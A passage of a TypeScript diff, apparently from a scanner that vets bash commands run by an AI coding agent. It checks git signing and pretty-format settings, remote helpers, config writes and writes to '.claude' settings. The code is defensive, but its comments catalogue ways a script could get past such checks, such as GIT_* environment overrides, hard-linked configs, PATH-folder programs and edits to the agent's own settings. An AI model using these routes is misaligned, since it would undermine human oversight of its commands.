+        const { text, whole } = words[at] as GitWord;
+        if (!text.startsWith('-')) return false;
+        const joined = text.indexOf('=') !== -1;
+        const name = joined ? text.slice(0, text.indexOf('=')) : text;
+        if (name !== '-c' && name !== '--config-env') {
+          if (GIT_GLOBAL_VALUES.has(name) && !joined) at++;
+          continue;
+        }
+        const value = joined ? { text: text.slice(name.length + 1), whole } : words[++at];
+        if (value === undefined) return false;
+        const equals = value.text.indexOf('=');
+        if (equals === -1 && !value.whole) continue;
+        const key = equals === -1 ? value.text : value.text.slice(0, equals);
+        if (SIGNING_CONFIG_KEY.test(key) && (name === '--config-env' || !value.whole)) return true;
+      }
+      return false;
+    };
+
+    /**
+     * Why git run with `words` as `form` may sign or verify under one of the settings `signs`: one that git, asked in
+     * the folder the call runs in with its own settings and the script's HOME and git config files, reads as true;
+     * one the script sets; or config git cannot read, or an earlier statement may have changed. Null when none. The
+     * `output` format the call selects is looked up among the pretty.<name> settings, or format.pretty when it names none.
+     */
+    const signingReason = async (
+      form: string,
+      signs: readonly string[],
+      words: readonly GitWord[],
+      node: Node,
+      output?: SignatureFormat
+    ): Promise<SigningFinding | null> => {
+      const selected = output?.value;
+      // Runtime-selected formats can request signature verification through configured programs.
+      if (selected && !selected.whole) {
+        return { text: 'with an output format the scan cannot read for signing', asks: true };
+      }
+      const pretty =
+        output?.kind === 'pretty' && (selected === undefined || (selected.whole && prettyNamesAlias(selected.text)));
+      if (signs.length === 0 && !pretty) return null;
+      const unread = { text: 'with git config the scan cannot read for signing', asks: true };
+      const place = gitPlace(words);
+      const scripted = place && scriptEnvironment(node, place.folder);
+      const env = place && scripted && configEnvironment(node, place.call.settings, scripted);
+      const handed = Object.keys(process.env).some(
+        name => /^GIT_CONFIG/i.test(name) && !/^GIT_CONFIG_(NOSYSTEM|GLOBAL|SYSTEM)$/i.test(name)
+      );
+      // git resolves a relative HOME or config path from the repository top, not the folder the call runs in.
+      const relative = [...SCRIPT_GIT_ENVIRONMENT_NAMES].some(name => {
+        const given = own(process.env as Record<string, string>, name);
+        return (
+          name !== 'GIT_CONFIG_NOSYSTEM' &&
+          given !== undefined &&
+          given !== '' &&
+          !isAbsoluteGitPath(given, startDirectory)
+        );
+      });
+      droppedEnvironment ??= unsetsGitEnvironment(tree.rootNode);
+      const unset = droppedEnvironment;
+      if (place === null || scripted === null || env === null || handed || relative || unset) {
+        // As auto mode asks for a program key given that way (gitRunsConfiguredProgram).
+        return signingSettingOpen(words) ? { text: 'with a signing setting the scan cannot read', asks: true } : unread;
+      }
+      // A call placed by --git-dir, --work-tree or a moved config reads files configSettled does not follow.
+      const configs = place.call.gitDir !== null || place.call.workTree !== null || Object.keys(scripted).length > 0;
+      const call = { ...place.call, env };
+      const others = changesOf(id => id !== node.id);
+      // A folder the script makes reads the config of the nearest one there now.
+      const folder = others.has('place') ? await nearestFolder(place.folder) : place.folder;
+      const key = JSON.stringify([folder, call]);
+      const signingAt = (at: string, how: GitSigningCall): Promise<ConfigEntry[] | null> => {
+        const id = JSON.stringify([at, how]);
+        let entries = signingConfigs.get(id);
+        if (entries === undefined) signingConfigs.set(id, (entries = gitSigningConfig(at, how)));
+        return entries;
+      };
+      const prettyAt = (at: string, how: GitSigningCall): Promise<ConfigEntry[] | null> => {
+        const id = JSON.stringify([at, how]);
+        let formats = prettyConfigs.get(id);
+        if (formats === undefined) prettyConfigs.set(id, (formats = gitPrettyConfig(at, how)));
+        return formats;
+      };
+      // log, show and the like also print what format.pretty, or a pretty.<alias> it names, asks for.
+      const reads = async (at: string, how: GitSigningCall, lead: string): Promise<SigningFinding | null> => {
+        const read = await signingAt(at, how);
+        if (read === null) return unread;
+        const on = settingsOn(read, signs);
+        if (on.length > 0) return { text: `${lead}with ${on[0]} set`, asks: true };
+        if (!pretty) return null;
+        const formats = await prettyAt(at, how);
+        if (formats === null) return unread;
+        if (!prettyShowsSignatures(formats, selected?.text)) return null;
+        const named = selected === undefined ? 'a format.pretty' : `--pretty=${selected.text.slice(0, 40)}`;
+        return { text: `${lead}with ${named} that may print signatures`, asks: true };
+      };
+      const changed = { text: 'after a config, repository, branch or folder change in the same script', asks: true };
+      // What a statement that may run before this one can change: only what the query below cannot already see.
+      const afterChange = async (kinds: ReadonlySet<HistoryChange>): Promise<SigningFinding | null> => {
+        if (kinds.has('signing')) return { text: 'after a signing config change in the same script', asks: true };
+        let found = kinds.has('any') ? changed : null;
+        if (kinds.has('branch')) {
+          let named = onBranchIncludes.get(key);
+          if (named === undefined) onBranchIncludes.set(key, (named = gitOnBranchIncludes(folder, call)));
+          if ((await named) !== 'none') {
+            found ??= {
+              text: 'after a branch change in the same script with an includeIf onbranch config',
+              asks: true,
+            };
+          }
+        }
+        if (!kinds.has('place')) return found;
+        // A script that names where git finds its templates or programs gives a new repository config of its own.
+        const moves = variableNames(/^GIT_(TEMPLATE_DIR|EXEC_PATH|DIR|WORK_TREE|COMMON_DIR)$/);
+        if (
+          place.call.gitDir !== null ||
+          place.call.workTree !== null ||
+          variables.set.some(({ name }) => moves.test(name.replace(/\[[^]*$/, '')))
+        ) {
+          return found ?? changed;
+        }
+        let located = freshLocations.get(key);
+        if (located === undefined) freshLocations.set(key, (located = gitFreshLocation(folder, call)));
+        const fresh = await located;
+        const after =
+          fresh && (await reads(fresh.folder, fresh.call, 'after a repository or folder change in the same script, '));
+        return after?.asks ? after : (found ?? (fresh === null ? changed : after));
+      };
+      historyChecks.push({
+        own: node.id,
+        anywhere: branching > 0 || backgrounded,
+        alongside: alongsideOf(node),
+        configs,
+        form,
+        reason: afterChange,
+      });
+      const after = others.size > 0 ? await afterChange(others) : null;
+      if (after?.asks) return after;
+      const written = configWrites.some(write => write.id !== node.id && !plainConfigWriters.has(write.id));
+      const unsettled = configs ? written : !(await configSettled(node, place.folder, true));
+      // Unsettled config cannot establish which verifier will run, even if the current config is unsigned.
+      const now = await reads(folder, call, '');
+      if (now?.asks) return now;
+      return after ?? (unsettled ? { text: 'after a config change in the same script', asks: true } : now);
+    };
+
+    const remoteSettings = new Map<string, Promise<GitRemoteSettings | null>>();
+    const remoteUrls = new Map<string, Promise<string[] | 'none' | null>>();
+
+    /**
+     * Whether every remote `contacts` names in `folder`, with the groups and defaults git may pick in its place, leads
+     * somewhere git reaches with its own transports, its URL rewrites applied: no `<helper>::` or unknown scheme, and
+     * no `remote.<name>.vcs`.
+     */
+    const remotesPlain = async (folder: string, contacts: GitContacts): Promise<boolean> => {
+      let settings = remoteSettings.get(folder);
+      if (settings === undefined) remoteSettings.set(folder, (settings = gitRemoteSettings(folder)));
+      const known = await settings;
+      if (known === null || known.rewrites.some(rule => !plainRemote(rule.base))) return false;
+      // git rewrites by the longest matching prefix, a push URL by a pushInsteadOf one first.
+      const rewritten = (url: string, push: boolean): string => {
+        const longest = (pushRules: boolean) =>
+          known.rewrites
+            .filter(rule => rule.push === pushRules && url.startsWith(rule.prefix))
+            .sort((a, b) => b.prefix.length - a.prefix.length)[0];
+        const rule = (push ? longest(true) : undefined) ?? longest(false);
+        return rule ? rule.base + url.slice(rule.prefix.length) : url;
+      };
+      const pushes = contacts.push ? [false, true] : [false];
+      // A default or group member of `.` is the repository itself.
+      const elsewhere = (name: string): boolean => name !== '.';
+      const everything = [...known.remotes, ...known.helpers, ...known.defaults.filter(elsewhere)];
+      // A group may shadow a remote of its name and hold other groups, so a name any group has is checked against all.
+      const namesGroup = (name: string): boolean =>
+        known.groups.some(group => group.name.toLowerCase() === name.toLowerCase());
+      const names =
+        contacts.remotes === 'all'
+          ? everything
+          : contacts.remotes.flatMap(name => (namesGroup(name) ? [name, ...everything] : [name]));
+      for (const name of names) {
+        if (known.helpers.includes(name)) return false;
+        // Outside a repository `git remote get-url` cannot run to resolve a remote the user config names.
+        if (known.outside && known.remotes.includes(name)) return false;
+        for (const push of pushes) {
+          const key = JSON.stringify([folder, name, push]);
+          let urls = remoteUrls.get(key);
+          // No remote name holds a `:`, so such a word is an address.
+          if (urls === undefined) {
+            remoteUrls.set(
+              key,
+              (urls = name.includes(':') || known.outside ? Promise.resolve('none') : gitRemoteUrls(folder, name, push))
+            );
+          }
+          const listed = await urls;
+          if (listed === null) return false;
+          // A clone reads the `vcs` of the remote it files the address under, `origin` by default.
+          if (listed === 'none' && known.helpers.length > 0) return false;
+          if ((listed === 'none' ? [rewritten(name, push)] : listed).some(url => !plainRemote(url))) return false;
+        }
+      }
+      return true;
+    };
+
+    /**
+     * Whether no write before `node` may have changed the config git reads in `folder`; one that may race it is
+     * checked after the walk, as for an alias.
+     */
+    const configSettled = async (node: Node, folder: string, signing = false): Promise<boolean> => {
+      const { folder: read, user, from } = await aliasSource(folder);
+      const config = await aliasesAt(read, user, from);
+      if (config === null) return false;
+      const check = {
+        ...(signing ? { signing: true as const } : {}),
+        own: node.id,
+        anywhere: branching > 0 || backgrounded,
+        alongside: alongsideOf(node),
+        cwd: read,
+        places: await aliasPlaces(config.includes),
+        folders: [],
+        programs: false,
+        legacy: !(await gitRefusesImplicitBare(read)),
+      };
+      for (const write of configWrites) {
+        if (signing && plainConfigWriters.has(write.id)) continue;
+        if (write.id !== node.id && (await aliasConfigTouched(write, check))) return false;
+      }
+      aliasChecks.push(check);
+      return true;
+    };
+
+    /** The values the script assigns the variables `pattern` names that `node` may run after; null for one the scan cannot place. */
+    const assignedValues = (
+      node: Node,
+      pattern: RegExp
+    ): { name: string; value: string | null; certain: boolean; prefixOf?: number }[] =>
+      variables.set.flatMap(({ name, value, uncertainOrder, startIndex, appends, prefixOf }) => {
+        const bare = name.replace(/\[[^]*$/, '');
+        if (!variableNames(pattern).test(bare) || value === undefined) return [];
+        if (branching === 0 && !uncertainOrder && startIndex > node.endIndex) return [];
+        // An append extends the value bash holds at run time, which the scan does not place.
+        const placed = name.includes('[') || appends ? null : value;
+        return [
+          {
+            name: bare,
+            value: placed,
+            certain: branching === 0 && !uncertainOrder,
+            ...(prefixOf !== undefined ? { prefixOf } : {}),
+          },
+        ];
+      });
+
+    /** Whether `node` is in a function body, where a prefix assignment on a call to the function reaches it. */
+    const inFunctionBody = (node: Node): boolean => {
+      for (let parent = node.parent; parent !== null; parent = parent.parent) {
+        if (parent.type === 'function_definition') return true;
+      }
+      return false;
+    };
+
+    /**
+     * The HOME, XDG_CONFIG_HOME and GIT_CONFIG_{NOSYSTEM,GLOBAL,SYSTEM} git run by `node` in `folder` gets, paths
+     * resolved from `folder`: its own prefix assignments, else plain ones before it; null when one is set more than
+     * once, conditionally or to a value the scan cannot place. Another command's prefix assignment does not reach it.
+     */
+    const scriptEnvironment = (node: Node, folder: string): Record<string, string> | null => {
+      const own = new Map<string, string | null>();
+      const earlier = new Map<string, { value: string | null; certain: boolean }[]>();
+      const inFunction = inFunctionBody(node);
+      for (const { name, value, certain, prefixOf } of assignedValues(node, SCRIPT_GIT_ENVIRONMENT)) {
+        if (prefixOf === undefined) {
+          earlier.set(name, [...(earlier.get(name) ?? []), { value, certain }]);
+        } else if (prefixOf === node.startIndex) {
+          own.set(name, own.has(name) ? null : value);
+        } else if (inFunction) {
+          return null;
+        }
+      }
+      const set = new Map<string, string>();
+      for (const name of new Set([...own.keys(), ...earlier.keys()])) {
+        const found = own.has(name) ? [{ value: own.get(name) as string | null, certain: true }] : earlier.get(name);
+        const [only, ...more] = found ?? [];
+        if (only === undefined || more.length > 0) return null;
+        const { value, certain } = only;
+        if (value === null || !certain || sep !== '/' || !/^[\w@%+=:,./\\-]*$/.test(value)) return null;
+        if (name !== 'GIT_CONFIG_NOSYSTEM' && value !== '' && !isAbsoluteGitPath(value, folder)) return null;
+        const kept = name === 'GIT_CONFIG_NOSYSTEM' || value === '' || !value.startsWith('/');
+        set.set(name, kept ? value : resolveOperand(folder, value));
+      }
+      return Object.fromEntries(set);
+    };
+
+    /**
+     * The user config files git run by `node` in `folder` reads in place of the shell's, as the script gives HOME or
+     * XDG_CONFIG_HOME a value before it; null when the scan cannot place one.
+     */
+    const movedUserConfig = (node: Node, folder: string | null): string[] | null => {
+      const values = (pattern: RegExp): (string | null)[] =>
+        assignedValues(node, pattern)
+          .filter(({ prefixOf }) => prefixOf === undefined || prefixOf === node.startIndex || inFunctionBody(node))
+          .map(({ value }) => value);
+      const homes = values(/^HOME$/);
+      const bases = values(/^XDG_CONFIG_HOME$/);
+      if (homes.length + bases.length === 0) return [];
+      const place = (value: string | null): string | null =>
+        value === null || folder === null || sep !== '/' || !/^[\w@%+=:,./-]+$/.test(value)
+          ? null
+          : resolveOperand(folder, value);
+      // git reads `$XDG_CONFIG_HOME/git/config`, or `$HOME/.config/git/config` when that is unset or empty.
+      const xdgFromHome = (process.env.XDG_CONFIG_HOME ?? '') === '' || bases.includes('');
+      const files: string[] = [];
+      for (const home of homes.map(place)) {
+        if (home === null) return null;
+        files.push(join(home, '.gitconfig'));
+        if (xdgFromHome) files.push(join(home, '.config', 'git', 'config'));
+      }
+      for (const base of bases.filter(value => value !== '').map(place)) {
+        if (base === null) return null;
+        files.push(join(base, 'git', 'config'));
+      }
+      return files;
+    };
+
+    /**
+     * Why the moved user config `files` may have git run a program: a setting the table does not list for `-c`, or a
+     * write before `node` that may change one; null when neither. A write that may race it is checked after the walk.
+     */
+    const userConfigReason = async (node: Node, folder: string, files: readonly string[]): Promise<string | null> => {
+      const named = files.map(file => (basename(file) === 'config' ? dirname(file) : file));
+      const followed = await Promise.all(named.map(place => physicalTarget(place).catch(() => null)));
+      if (followed.some(place => place === null)) return 'with a user config the scan cannot place';
+      const check = {
+        own: node.id,
+        anywhere: branching > 0 || backgrounded,
+        alongside: alongsideOf(node),
+        cwd: folder,
+        places: [...named, ...(followed as string[])].map(place => guardForm(place)),
+        folders: [],
+        programs: false,
+        legacy: false,
+      };
+      for (const write of configWrites) {
+        if (write.id !== node.id && (await aliasConfigTouched(write, check))) {
+          return 'after a user config change in the same script';
+        }
+      }
+      aliasChecks.push(check);
+      for (const file of files) {
+        const settings = await gitConfigFile(file);
+        if (settings === null) return 'with a user config the scan cannot read';
+        // A key given without `=` is a boolean set true.
+        if (settings.some(({ key, value }) => !listedSetting(key, value ?? 'true'))) {
+          return 'with a user config setting the table does not list';
+        }
+      }
+      return null;
+    };
+
+    /**
+     * Records `folder` as reached whole, and a write there as reaching the settings of a session folder in it.
+     * `dotless` when only names without a leading dot are reached directly under it.
+     */
+    const reachFolder = async (folder: string, dotless: boolean, reach: Reach | null): Promise<void> => {
+      (dotless ? dotlessGlobFolders : globFolders).add(folder);
+      if (reach !== 'write') return;
+      const form = guardForm(folder);
+      for (const base of settingsBases) {
+        const settings = join(base, '.claude');
+        const target = guardForm(settings);
+        if (!guardFormWithin(form, target) || form === target) continue;
+        if (dotless && target.slice(form.length).replace(/^\/+/, '').startsWith('.')) continue;
+        addPath(settings);
+      }
+      if (dotless) return;
+      const settings = await lstat(join(folder, '.claude')).then(
+        () => true,
+        (error: unknown) => (missing(error) ? false : null)
+      );
+      if (settings === null) unreadOperands++;
+      else if (settings) addPath(join(folder, '.claude'));
+    };
+
+    const processPath = (text: string, cwd: string): boolean =>
+      throughProcess(text, wslLocation(cwd)?.linuxPath ?? cwd);
+
+    /**
+     * The paths a glob operand expands to through a link, which are checked again as written. Null when the expansion
+     * is too large to read, or matches nothing while nullglob, globstar or nocaseglob may be on: bash may then drop the
+     * operand (find given none acts on `.`) or match names the walk does not. Empty where the scan does not expand
+     * (Windows, a WSL folder) unless one of those options may be on.
+     */
+    const linkMatches = async (word: OperandWord, operand: ReadOperand, cwd: string): Promise<string[] | null> => {
+      if (operand.start === null || operand.unread) return [];
+      if (sep !== '/' || wslLocation(cwd) !== null) return globOptions ? null : [];
+      const found = await globExpansion(word, cwd, dotGlob, stopped);
+      if (found === null || (globOptions && found.length === 0)) return null;
+      return found.filter(match => match.linked).map(match => match.path);
+    };
+
+    /** Counts an exact operand unread when a link on its way leads into a process's own folders. */
+    const viaProcessLink = async (text: string, cwd: string): Promise<void> => {
+      if (sep !== '/' || wslLocation(cwd) !== null || (state.lost && !posix.isAbsolute(text))) return;
+      if ((await linksThroughProcess(posix.isAbsolute(text) ? text : under(cwd, text))) !== false) unreadOperands++;
+    };
+
+    /**
+     * Whether what a lister or static producer reads now is what it prints when `node` runs: no other command of
+     * the script writes, changes git state or cannot be read before it, nor anywhere when `node` may run again (in a
+     * loop, a branch or a function body) or alongside it in its pipeline; the last two are settled after the walk.
+     */
+    const trusted = (node: Node, producer: Node | null): boolean => {
+      const own = new Set([node.id, ...(producer ? [producer.id] : [])]);
+      if (unreadOperands > 0 || touchedBy.some(id => !own.has(id))) return false;
+      const pipeline = node.parent?.type === 'pipeline' ? node.parent.descendantsOfType('command') : [];
+      laterChecks.push({
+        own,
+        anywhere: branching > 0,
+        alongside: new Set(pipeline.flatMap(command => (command ? [command.id] : []))),
+      });
+      return true;
+    };
+
+    /** The commands and redirects that run alongside `node`: the rest of its pipeline, and its statement's redirects. */
+    const alongsideOf = (node: Node): ReadonlySet<number> => {
+      let unit = node;
+      while (unit.parent?.type === 'redirected_statement' || unit.parent?.type === 'pipeline') unit = unit.parent;
+      if (unit.id === node.id) return new Set();
+      return new Set(unit.descendantsOfType(['command', 'file_redirect']).flatMap(found => (found ? [found.id] : [])));
+    };
+
+    const granted = roots.map(root => guardForm(root));
+
+    /** A PATH entry in guard form, without trailing separators. */
+    const pathForm = (entry: string): string => guardForm(entry.replace(/[\\/]+$/, '') || entry);
+
+    /**
+     * Where beyond the repository git reads aliases (its XDG folder, the user gitconfig, includes), as named and as
+     * their links lead; null when the scan cannot place them all.
+     */
+    const aliasPlaces = async (includes: readonly string[] | null): Promise<string[] | null> => {
+      if (includes === null) return null;
+      const xdg = process.env.XDG_CONFIG_HOME || join(home, '.config');
+      const named = [join(xdg, 'git'), join(home, '.gitconfig'), ...includes];
+      const followed = await Promise.all(named.map(place => physicalTarget(place).catch(() => null)));
+      if (followed.some(place => place === null)) return null;
+      return [...named, ...(followed as string[])].map(place => guardForm(place));
+    };
+
+    /** Whether `write` (to `target`, as named or as its links lead) may change a config git reads aliases from. */
+    const configTouchedAt = (
+      write: (typeof configWrites)[number],
+      target: string,
+      { cwd, real, places, folders, dirs, programs, existing, fresh }: AliasKnown
+    ): boolean => {
+      const form = guardForm(target);
+      // A program written into a PATH folder, or a folder there laid down around it, may run in place of an alias.
+      const onPath = folders.some(
+        folder =>
+          guardFormWithin(folder, form) ||
+          (write.tree === true && guardFormWithin(form, folder) && (fresh || existing.has(folder)))
+      );
+      // A git writer rewrites work-tree files, which may include a file a place names; a clone or work tree lays
+      // down a folder that may hold programs.
+      if (gitCommands.has(write.id)) {
+        const sub = createdFolders.get(write.id)?.sub;
+        if ((sub === 'clone' || sub === 'worktree') && onPath) return true;
+        return places.some(place => guardFormWithin(form, place) || guardFormWithin(place, form));
+      }
+      if (onPath) return true;
+      if (programs) return false;
+      // git finds a `.git` in the folder it runs in or one above it.
+      const dotGit = /(^|\/)\.git(\/|$)/.exec(form);
+      const parent = dotGit ? form.slice(0, dotGit.index) || '/' : null;
+      if (parent !== null && [guardForm(cwd), real].some(place => guardFormWithin(parent, place))) return true;
+      const name = posix.basename(form);
+      if (name === '.gitconfig' || name === 'gitconfig') return true;
+      // A folder taken away at or above where git runs may be put back holding a `.git`.
+      if (write.removal && [guardForm(cwd), real].some(place => guardFormWithin(form, place))) return true;
+      // The git dir and common dir may sit outside any `.git` folder (a `.bare` layout, a linked work tree).
+      if (dirs.some(dir => guardFormWithin(dir, form) || (write.tree === true && guardFormWithin(form, dir))))
+        return true;
+      if (write.tree) return places.some(place => guardFormWithin(form, place));
+      return places.some(place => guardFormWithin(place, form));
+    };
+
+    interface AliasKnown {
+      cwd: string;
+      /** The folder git reads in, as its links lead (the nearest part that exists). */
+      real: string;
+      places: readonly string[];
+      folders: readonly string[];
+      dirs: readonly string[];
+      programs: boolean;
+      /** The PATH folders (guard form) that exist, and whether the write's target is made new (so any folder under it is). */
+      existing: ReadonlySet<string>;
+      fresh: boolean;
+    }
+
+    const gitDirectoryLists = new Map<string, Promise<string[] | null>>();
+
+    /** The git dir and common dir git reads config from in `cwd`; none outside a repository, null when git could not say. */
+    const gitDirsOf = (cwd: string): Promise<string[] | null> => {
+      let dirs = gitDirectoryLists.get(cwd);
+      if (dirs === undefined) gitDirectoryLists.set(cwd, (dirs = gitDirectories(cwd)));
+      return dirs;
+    };
+
+    const physicalForms = new Map<string, Promise<string | null>>();
+
+    /** Whether `write` may change that config, by the path it names or the one its links lead to. */
+    const aliasConfigTouched = async (
+      write: (typeof configWrites)[number],
+      check: {
+        cwd: string;
+        places: readonly string[] | null;
+        folders: readonly string[];
+        programs: boolean;
+        legacy: boolean;
+      }
+    ): Promise<boolean> => {
+      const { cwd, places, folders, programs } = check;
+      if (places === null || check.legacy || wslLocation(cwd) !== null) return true;
+      if (write.path === undefined) {
+        return !write.unlisted || places.some(place => granted.some(root => guardFormWithin(root, place)));
+      }
+      const dirs = programs ? [] : await gitDirsOf(cwd);
+      if (dirs === null) return true;
+      let near = cwd;
+      while ((await stat(near).catch(() => null)) === null && dirname(near) !== near) near = dirname(near);
+      const real = guardForm(await physicalTarget(near).catch(() => near));
+      const present = async (path: string): Promise<boolean> => (await stat(path).catch(() => null)) !== null;
+      const existing = new Set<string>();
+      for (const folder of folders) if (await present(folder)) existing.add(folder);
+      const made = createdFolders.get(write.id)?.sub;
+      const fresh = made === 'clone' || made === 'worktree' || !(await present(write.path));
+      const known: AliasKnown = {
+        cwd,
+        real,
+        places,
+        folders,
+        dirs: dirs.map(dir => guardForm(dir)),
+        programs,
+        existing,
+        fresh,
+      };
+      if (configTouchedAt(write, write.path, known)) return true;
+      const path = write.path;
+      let physical = physicalForms.get(path);
+      if (!physical) {
+        physical = physicalTarget(path).catch(() => path);
+        physicalForms.set(path, physical);
+      }
+      const followed = (await physical) ?? path;
+      if (followed !== path && configTouchedAt(write, followed, known)) return true;
+      // git replaces a work-tree file rather than writing through a link.
+      return !programs && !gitCommands.has(write.id) && (await sharesConfigFile(path, check, dirs));
+    };
+
+    const configFileIds = new Map<string, Promise<Set<string>>>();
+
+    /** Whether the file at `path` is a hard link to a config file git reads in `cwd` (the repository's, or a place's). */
+    const sharesConfigFile = async (
+      path: string,
+      { cwd, places }: { cwd: string; places: readonly string[] | null },
+      dirs: readonly string[]
+    ): Promise<boolean> => {
+      const info = await stat(path).catch(() => null);
+      if (!info?.isFile() || info.nlink < 2) return false;
+      let ids = configFileIds.get(cwd);
+      if (ids === undefined) {
+        ids = (async () => {
+          const [gitDir, commonDir = gitDir] = dirs;
+          const files = [
+            ...(gitDir === undefined
+              ? []
+              : [
+                  join(commonDir as string, 'config'),
+                  join(gitDir, 'config.worktree'),
+                  join(commonDir as string, 'config.worktree'),
+                ]),
+            ...(places ?? []).flatMap(place => [place, join(place, 'config')]),
+          ];
+          const found = new Set<string>();
+          for (const file of files) {
+            const config = await stat(file).catch(() => null);
+            if (config?.isFile()) found.add(`${config.dev}:${config.ino}`);
+          }
+          return found;
+        })();
+        configFileIds.set(cwd, ids);
+      }
+      return (await ids).has(`${info.dev}:${info.ino}`);
+    };
+
+    /**
+     * Checks what a lister may print as operands of a program that reads it, or writes it when `writing`: each
+     * folder it lists from, each link it may print, and, for a writer, each settings file it may print and each
+     * folder holding one. When xargs `split`s names at blanks and quotes, no printed name may hold one.
+     */
+    const listingChecked = async (listing: Listing, writing: boolean, split: boolean): Promise<boolean> => {
+      const { folders, tracked, links: found, tests, settings } = listing;
+      if (state.lost || sep !== '/' || wslLocation(state.cwd) !== null) return false;
+      // Under a GIT_* setting git may read another index or repository than the one the scan asks about.
+      if ((found === 'index' || found === 'diff') && gitEnvironment) return false;
+      if (listing.gitPathspecs !== undefined && !pathspecsKept(listing.gitPathspecs)) return false;
+      const budget = { entries: WALK_ENTRIES };
+      const reach: Reach = writing ? 'write' : 'read';
+      const whole = writing && settings.kind === 'tree';
+      const starts: string[] = [];
+      const places: string[] = [];
+      for (const folder of folders) {
+        const words = operandWords(folder, scope());
+        if (words === null) return false;
+        for (const word of words) {
+          const operand = readOperand(word, posix.dirname);
+          if (operand.unread || operand.start !== null) return false;
+          const root = posix.isAbsolute(operand.path) ? operand.path : under(state.cwd, operand.path);
+          if (underCreatedLink(state.cwd, operand.path, 'program')) return false;
+          const self = await lstat(root).then(
+            info => info.isSymbolicLink(),
+            (error: unknown) => (missing(error) ? false : null)
+          );
+          if (self === null || (self && tracked)) return false;
+          const links = self ? [root] : found === 'walk' ? await linksUnder(root, budget, stopped) : [];
+          if (links === null || (tracked && links.length > 0)) return false;
+          if (whole) noteWrite(folder, writtenTrees);
+          await checkArgument(word, whole ? 'write' : 'read', true);
+          for (const link of links) await checkArgument(exactWord(link), reach, true);
+          starts.push(word.text);
+          places.push(root);
+        }
+      }
+      const printed: string[] = [];
+      if (found === 'index') {
+        const listed = await indexListed(state.cwd, listing.pathspecs ?? starts, stopped);
+        if (listed === null || (split && listed.odd)) return false;
+        printed.push(...listed.links);
+        if (writing && settings.kind === 'index') {
+          for (const file of listed.settings) {
+            if ((!settings.changedOnly || file.changed) && (await mayHold(file.path, settings.patterns))) {
+              writes.add(file.path);
+            }
+          }
+        }
+      }
+      if (found === 'diff') {
+        const top = await gitToplevel(state.cwd);
+        if (settings.kind !== 'diff' || top === null || top !== (await realpath(state.cwd).catch(() => null))) {
+          return false;
+        }
+        if (listing.globs !== undefined && listing.globs.length > 0 && globOptions) return false;
+        const matched: string[] = [];
+        for (const glob of listing.globs ?? []) {
+          const names = await globNames(state.cwd, glob, stopped);
+          // git reads a name with a leading `:` as magic for that name alone (`:/x` from the top, `:!x` an exclude); a
+          // bare `:`, or excludes with no other pathspec, match every path.
+          if (names === null || names.some(name => name.startsWith(':'))) return false;
+          // git reads a name holding `[`, `]`, `?`, `*` or `\` as a pattern too, so its own git gets it as written.
+          matched.push(...names.filter(name => /[[\]?*\\]/.test(name)));
+        }
+        const diff = await diffTargets(top, settings.words, settings.cached, stopped);
+        if (diff === null || !pathspecsKept(diff.pathspecs)) return false;
+        const pathspecs = [...diff.pathspecs, ...(listing.pathspecs ?? []), ...matched];
+        const listed = await diffListed(top, diff.targets, diff.worktree, pathspecs, stopped);
+        if (listed === null || (split && listed.odd)) return false;
+        printed.push(...listed.links);
+        if (writing) for (const file of listed.settings) writes.add(file);
+      }
+      if (found === 'find') {
+        const links = await findLinks(state.cwd, starts, tests ?? [], roots);
+        if (links === null) return false;
+        printed.push(...links);
+      }
+      if (split && !tracked) {
+        // rg and grep print only files, and only those that may hold their pattern.
+        const walked = settings.kind === 'walked' ? settings : null;
+        const odd = await findOddPaths(
+          state.cwd,
+          starts,
+          settings.kind === 'find' ? (tests ?? []) : [],
+          roots,
+          walked ? ['-type', 'f'] : []
+        );
+        if (odd === null) return false;
+        for (const path of odd) if (!walked || (await mayHold(path, walked.patterns))) return false;
+      }
+      for (const link of printed) await checkArgument(exactWord(link), reach, true);
+      if (!writing) return true;
+      if (settings.kind === 'find') {
+        const files = await findSettings(state.cwd, starts, tests ?? [], roots);
+        if (files === null) return false;
+        for (const file of files) writes.add(file);
+        // A folder it prints is rewritten whole by `rm -rf` or `chmod -R`.
+        const printedFolders = settings.files ? [] : await findFolders(state.cwd, starts, tests ?? [], roots);
+        if (printedFolders === null) return false;
+        for (const folder of printedFolders) {
+          const physical = await realpath(folder).catch(() => folder);
+          if (/^\.claude$/i.test(posix.basename(physical)) || settingsBases.some(base => isWithin(physical, base))) {
+            noteWrite(folder, writtenTrees);
+          }
+        }
+      }
+      if (settings.kind === 'walked') {
+        for (const place of places) {
+          const files = await settingsUnder(place, settingsBases);
+          if (files === null) return false;
+          for (const file of files) {
+            const below = posix.relative(place, file).split('/');
+            if (grepSkips(settings, below)) continue;
+            if (await mayHold(file, settings.patterns)) writes.add(file);
+          }
+        }
+      }
+      return true;
+    };
+
+    /**
+     * Checks the words a static producer prints as operands of the `consumer` xargs hands them to. Each must reach
+     * xargs as one plain word (no blank, quote, backslash, glob character or leading `-`), so the program gets
+     * exactly the paths checked here. A folder among them is read whole, by a program that follows no link, or
+     * rewritten whole.
+     */
+    const fedChecked = async (feed: StaticFeed, writing: boolean, consumer: readonly string[]): Promise<boolean> => {
+      if (state.lost || sep !== '/' || wslLocation(state.cwd) !== null) return false;
+      const texts: string[] = [];
+      for (const raw of feed.words) {
+        const words = operandWords(raw, scope());
+        if (words === null) return false;
+        for (const word of words) {
+          if (word.expandAt !== null) return false;
+          const globbed = readOperand(word, posix.dirname).start !== null;
+          const expanded = globbed ? await globExpansion(word, state.cwd, dotGlob, stopped) : null;
+          if (globbed && (expanded === null || (expanded.length === 0 && !feed.ls))) return false;
+          texts.push(
+            ...(expanded
+              ? expanded.map(({ path }) => (word.text.startsWith('/') ? path : posix.relative(state.cwd, path)))
+              : [word.text])
+          );
+        }
+      }
+      const pathOf = (text: string): string => (posix.isAbsolute(text) ? text : under(state.cwd, text));
+      const kindOf = (text: string): Promise<'file' | 'folder' | 'missing' | null> =>
+        stat(pathOf(text)).then(
+          info => (info.isDirectory() ? 'folder' : 'file'),
+          (error: unknown) => (missing(error) ? 'missing' : null)
+        );
+      if (feed.ls && !feed.dirs && (await Promise.all(texts.map(kindOf))).includes('folder')) {
+        // ls prints its one folder operand's entries bare, which the program reads from here, not from that folder.
+        if (texts.length !== 1) return false;
+        const entries = await readdir(pathOf(texts[0] as string)).catch(() => null);
+        if (entries === null || entries.length > FED_ENTRIES) return false;
+        texts.splice(0, 1, ...entries.filter(name => !name.startsWith('.')));
+      }
+      const follows = followsLinks(programName(unquote(consumer[0] ?? '')), consumer.slice(1));
+      for (const text of texts) {
